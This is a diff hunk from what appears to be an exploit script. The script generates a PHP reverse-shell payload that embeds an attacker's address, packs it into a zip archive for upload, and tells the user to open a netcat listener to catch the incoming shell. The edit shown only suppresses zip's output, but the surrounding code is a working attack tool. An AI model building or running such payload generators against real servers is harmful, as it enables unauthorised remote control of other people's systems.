@@ -157,7 +157,7 @@ try:
     '''
     payload = payload_prefix + payload_address + payload_suffix
     open(f"{sys.argv[3]}.php",'w').write(payload)
-    os.system(f"zip {sys.argv[3]}.zip {sys.argv[3]}.php")
+    os.system(f"zip {sys.argv[3]}.zip {sys.argv[3]}.php > /dev/null")
     os.system(f"rm -f {sys.argv[3]}.php")
     print(f"{bcolors.OKGREEN}[+]{bcolors.ENDC} Payload Generated with the name of {sys.argv[3]}.zip")
     print(f"{bcolors.WARNING}[+]{bcolors.ENDC} Dont forget to use {bcolors.OKGREEN}# nc -nlvp {sys.argv[2]}{bcolors.ENDC}")
